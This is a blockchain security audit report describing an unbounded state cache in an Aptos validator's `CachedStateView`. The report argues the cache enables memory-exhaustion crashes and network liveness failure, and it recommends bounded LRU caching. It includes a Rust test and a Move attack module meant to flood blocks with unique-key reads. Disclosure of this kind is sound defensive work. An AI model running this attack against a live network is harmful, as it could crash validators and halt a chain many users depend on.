# Audit Report

## Title
Unbounded State Cache Exhaustion Leading to Validator Node OOM and Network Liveness Failure

## Summary
The `CachedStateView` implementation lacks any size limits on its `memorized` cache, allowing attackers to force validators to cache gigabytes of state data per block by submitting transactions that read many unique state keys. With typical pipeline depths of 20-30 blocks, this leads to 60-90+ GB memory consumption, causing validator nodes to crash via out-of-memory (OOM) errors and resulting in total network liveness failure.

## Finding Description

The vulnerability exists in the `ShardedStateCache` structure used by `CachedStateView` to memorize all state reads during block execution. [1](#0-0) 

The cache has **no size limits** and accumulates every unique state key read during block execution. When `get_state_slot` is called, every cache miss results in permanent insertion: [2](#0-1) 

**Attack Path:**

1. A single `CachedStateView` instance is created per block and shared across all transactions: [3](#0-2) 

2. All transactions in the block execute using this shared state view, with each unique state read being cached: [4](#0-3) 

3. The cached reads are extracted and stored in `ExecutionOutput`, persisting in memory until block pruning: [5](#0-4) 

4. Multiple blocks remain in the execution pipeline (typically 20-30 blocks) before pruning: [6](#0-5) 

**Exploitation:**

An attacker crafts transactions that read many unique state keys (e.g., iterating over table items, reading many account resources). Gas limits per transaction allow: [7](#0-6) 

- **Per-read cost**: ~302,385 + (151 × 4,096) = ~920,881 internal gas units
- **Max IO gas**: 1,000,000,000 internal gas units
- **Max reads per transaction**: ~1,086 unique keys
- **Max transactions per block**: 10,000 [8](#0-7) 

**Memory Impact:**
- Per block: 10,000 txns × 1,086 reads = 10,860,000 cached entries
- Per entry: ~300 bytes (StateKey + StateSlot)
- Per block memory: ~3.3 GB
- Pipeline depth: 20-30 blocks
- **Total memory consumption: 66-99 GB**, causing validator node OOM crashes

## Impact Explanation

This vulnerability achieves **Critical Severity** under the Aptos bug bounty program classification of "Total loss of liveness/network availability."

When validators crash due to OOM:
- Consensus cannot proceed (requires 2f+1 honest validators)
- Network enters liveness failure
- Requires manual node restarts and potentially state synchronization
- Attack can be repeated continuously, making recovery impossible

The attack breaks **Critical Invariant #9: Resource Limits** - while gas limits are enforced, memory consumption is unbounded, violating the principle that "all operations must respect gas, storage, and computational limits."

## Likelihood Explanation

**Likelihood: HIGH**

- **Attacker Requirements**: 
  - Regular user: ~9.2 APT to fill one block (10,000 transactions × 920 gas units × 100 Octas/gas)
  - Malicious validator: Zero cost (can propose blocks directly)
  
- **Technical Complexity**: LOW - Simple Move script reading table entries or account resources
  
- **Detection**: Difficult to distinguish from legitimate high-throughput applications
  
- **Barriers**: None - no special permissions required, gas costs are minimal

The attack is economically viable and technically trivial, requiring only basic Move programming knowledge.

## Recommendation

Implement bounded caching with an LRU (Least Recently Used) eviction policy:

1. **Add size limits to `ShardedStateCache`**:
   - Maximum number of entries (e.g., 100,000 per block)
   - Maximum total memory (e.g., 100 MB per block)
   - Evict oldest/least-used entries when limits are exceeded

2. **Implement cache size tracking**:
   ```rust
   pub struct ShardedStateCache {
       next_version: Version,
       pub shards: [StateCacheShard; NUM_STATE_SHARDS],
       total_entries: AtomicUsize,  // Track total entries
       max_entries: usize,           // Enforce limit
   }
   ```

3. **Add eviction logic in `try_insert`**:
   - Check if cache size exceeds limit before insertion
   - If exceeded, evict entries using LRU policy
   - Prioritize keeping frequently accessed keys

4. **Alternative: Use bounded concurrent cache library** (e.g., `moka` or `lru` crate with sharding)

5. **Monitor and alert**: Add metrics for cache size per block to detect attacks early

## Proof of Concept

```rust
// Rust test demonstrating unbounded memory growth
#[test]
fn test_cache_exhaustion_attack() {
    use aptos_storage_interface::state_store::state_view::cached_state_view::{
        CachedStateView, ShardedStateCache
    };
    use aptos_types::state_store::{state_key::StateKey, StateViewId};
    
    // Create a state view
    let state = State::new_empty(HotStateConfig::default());
    let state_view = CachedStateView::new_dummy(&state);
    
    // Simulate an attacker reading 10 million unique keys
    // (equivalent to ~1,000 reads × 10,000 transactions)
    for i in 0..10_000_000 {
        let key = StateKey::raw(format!("attack_key_{}", i).into_bytes());
        let _ = state_view.get_state_slot(&key);
    }
    
    // Extract memorized reads
    let cache = state_view.into_memorized_reads();
    
    // Verify massive memory consumption
    let mut total_entries = 0;
    for shard in &cache.shards {
        total_entries += shard.len();
    }
    
    assert!(total_entries >= 10_000_000);
    // Each entry is ~300 bytes = ~3 GB total memory
    // With 20 blocks in pipeline = 60 GB+ memory usage
}
```

```move
// Move PoC: Transaction that reads many unique table items
module attacker::cache_exhaustion {
    use aptos_framework::table::{Self, Table};
    
    struct AttackTable has key {
        data: Table<u64, u64>
    }
    
    // Setup: Create table with many entries (done once)
    public entry fun setup(account: &signer) {
        let table = table::new<u64, u64>();
        // Populate with 100,000 entries
        let i = 0;
        while (i < 100000) {
            table::add(&mut table, i, i);
            i = i + 1;
        };
        move_to(account, AttackTable { data: table });
    }
    
    // Attack: Read ~1,000 unique keys per transaction
    // Submit 10,000 such transactions per block
    public entry fun attack_read(addr: address, start: u64) acquires AttackTable {
        let table_ref = &borrow_global<AttackTable>(addr).data;
        let i = start;
        let end = start + 1000;
        
        while (i < end) {
            // Each borrow reads a unique state key
            let _ = table::borrow(table_ref, i);
            i = i + 1;
        };
        // Gas cost: ~920,000 internal gas units (< 1B limit)
        // Memory cached: 1,000 entries × 300 bytes = ~300 KB
        // Per block: 10,000 txns × 300 KB = 3 GB
    }
}
```

**Notes**

The vulnerability is exacerbated by the pipeline execution model where multiple blocks are processed concurrently. The lack of cache eviction means memory accumulates linearly with the number of unique keys read across all in-flight blocks. This is particularly severe because the `ExecutionOutput` containing the cached reads persists until blocks are pruned, which happens asynchronously after consensus commitment. A sophisticated attacker could coordinate multiple blocks to maximize memory pressure across all validators simultaneously, making node crashes deterministic rather than probabilistic.

### Citations

**File:** storage/storage-interface/src/state_store/state_view/cached_state_view.rs (L47-85)
```rust
#[derive(Debug)]
pub struct ShardedStateCache {
    next_version: Version,
    pub shards: [StateCacheShard; NUM_STATE_SHARDS],
}

impl ShardedStateCache {
    pub fn new_empty(version: Option<Version>) -> Self {
        Self {
            next_version: version.map_or(0, |v| v + 1),
            shards: Default::default(),
        }
    }

    fn shard(&self, shard_id: usize) -> &StateCacheShard {
        &self.shards[shard_id]
    }

    pub fn get_cloned(&self, state_key: &StateKey) -> Option<StateSlot> {
        self.shard(state_key.get_shard_id())
            .get(state_key)
            .map(|r| r.clone())
    }

    pub fn next_version(&self) -> Version {
        self.next_version
    }

    pub fn try_insert(&self, state_key: &StateKey, slot: &StateSlot) {
        let shard_id = state_key.get_shard_id();

        match self.shard(shard_id).entry(state_key.clone()) {
            Entry::Occupied(_) => {},
            Entry::Vacant(entry) => {
                entry.insert(slot.clone());
            },
        };
    }
}
```

**File:** storage/storage-interface/src/state_store/state_view/cached_state_view.rs (L283-297)
```rust
    fn get_state_slot(&self, state_key: &StateKey) -> StateViewResult<StateSlot> {
        let _timer = TIMER.timer_with(&["get_state_value"]);
        COUNTER.inc_with(&["sv_total_get"]);

        // First check if requested key is already memorized.
        if let Some(slot) = self.memorized.get_cloned(state_key) {
            COUNTER.inc_with(&["sv_memorized"]);
            return Ok(slot);
        }

        // TODO(aldenhu): reduce duplicated gets
        let slot = self.get_unmemorized(state_key)?;
        self.memorized.try_insert(state_key, &slot);
        Ok(slot)
    }
```

**File:** execution/executor/src/block_executor/mod.rs (L226-233)
```rust
                let state_view = {
                    let _timer = OTHER_TIMERS.timer_with(&["get_state_view"]);
                    CachedStateView::new(
                        StateViewId::BlockExecution { block_id },
                        Arc::clone(&self.db.reader),
                        parent_output.result_state().latest().clone(),
                    )?
                };
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L59-78)
```rust
    pub fn by_transaction_execution<V: VMBlockExecutor>(
        executor: &V,
        transactions: ExecutableTransactions,
        auxiliary_infos: Vec<AuxiliaryInfo>,
        parent_state: &LedgerState,
        state_view: CachedStateView,
        onchain_config: BlockExecutorConfigFromOnchain,
        transaction_slice_metadata: TransactionSliceMetadata,
    ) -> Result<ExecutionOutput> {
        let out = match transactions {
            ExecutableTransactions::Unsharded(txns) => {
                Self::by_transaction_execution_unsharded::<V>(
                    executor,
                    txns,
                    auxiliary_infos,
                    parent_state,
                    state_view,
                    onchain_config,
                    transaction_slice_metadata,
                )?
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L420-426)
```rust
        let (result_state, hot_state_updates) = parent_state.update_with_memorized_reads(
            base_state_view.persisted_hot_state(),
            base_state_view.persisted_state(),
            to_commit.state_update_refs(),
            base_state_view.memorized_reads(),
        );
        let state_reads = base_state_view.into_memorized_reads();
```

**File:** config/src/config/consensus_config.rs (L20-24)
```rust
const MAX_SENDING_BLOCK_TXNS_AFTER_FILTERING: u64 = 1800;
const MAX_SENDING_OPT_BLOCK_TXNS_AFTER_FILTERING: u64 = 1000;
const MAX_SENDING_BLOCK_TXNS: u64 = 5000;
pub(crate) static MAX_RECEIVING_BLOCK_TXNS: Lazy<u64> =
    Lazy::new(|| 10000.max(2 * MAX_SENDING_BLOCK_TXNS));
```

**File:** config/src/config/consensus_config.rs (L232-247)
```rust
            max_pruned_blocks_in_mem: 100,
            mempool_executed_txn_timeout_ms: 1000,
            mempool_txn_pull_timeout_ms: 1000,
            round_initial_timeout_ms: 1000,
            // 1.2^6 ~= 3
            // Timeout goes from initial_timeout to initial_timeout*3 in 6 steps
            round_timeout_backoff_exponent_base: 1.2,
            round_timeout_backoff_max_exponent: 6,
            safety_rules: SafetyRulesConfig::default(),
            sync_only: false,
            internal_per_key_channel_size: 10,
            quorum_store_pull_timeout_ms: 400,
            quorum_store_poll_time_ms: 300,
            // disable wait_for_full until fully tested
            // We never go above 20-30 pending blocks, so this disables it
            wait_for_full_blocks_above_pending_blocks: 100,
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L88-104)
```rust
        [
            storage_io_per_state_slot_read: InternalGasPerArg,
            { 0..=9 => "load_data.base", 10.. => "storage_io_per_state_slot_read"},
            // At the current mainnet scale, we should assume most levels of the (hexary) JMT nodes
            // in cache, hence target charging 1-2 4k-sized pages for each read. Notice the cost
            // of seeking for the leaf node is covered by the first page of the "value size fee"
            // (storage_io_per_state_byte_read) defined below.
            302_385,
        ],
        [
            storage_io_per_state_byte_read: InternalGasPerByte,
            { 0..=9 => "load_data.per_byte", 10.. => "storage_io_per_state_byte_read"},
            // Notice in the latest IoPricing, bytes are charged at 4k intervals (even the smallest
            // read will be charged for 4KB) to reflect the assumption that every roughly 4k bytes
            // might require a separate random IO upon the FS.
            151,
        ],
```
